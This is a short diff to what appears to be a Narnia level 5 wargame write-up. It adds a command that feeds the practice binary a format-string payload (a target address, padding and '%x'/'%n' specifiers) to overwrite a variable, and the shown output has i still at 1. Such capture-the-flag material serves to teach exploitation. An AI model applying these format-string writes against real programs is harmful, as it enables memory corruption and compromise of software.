@@ -46,6 +46,7 @@ narnia5@melinda:/narnia$ ./narnia5 AAAA%x%x%x%x%x
 Change i's value from 1 -> 500. No way...let me give you a hint!
 buffer : [AAAAf7eb6716ffffffffffffd6aef7e2ec3441414141] (44)
 i = 1 (0xffffd6cc)  
+narnia5@melinda:/narnia$ ./narnia5 $(python -c'print "\xcc\xd6\xff\xff" + "A"*500 + "%x%x%x%x%n"')
 Change i's value from 1 -> 500. No way...let me give you a hint!
 buffer : [????AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA] (63)
 i = 1 (0xffffd4dc)  
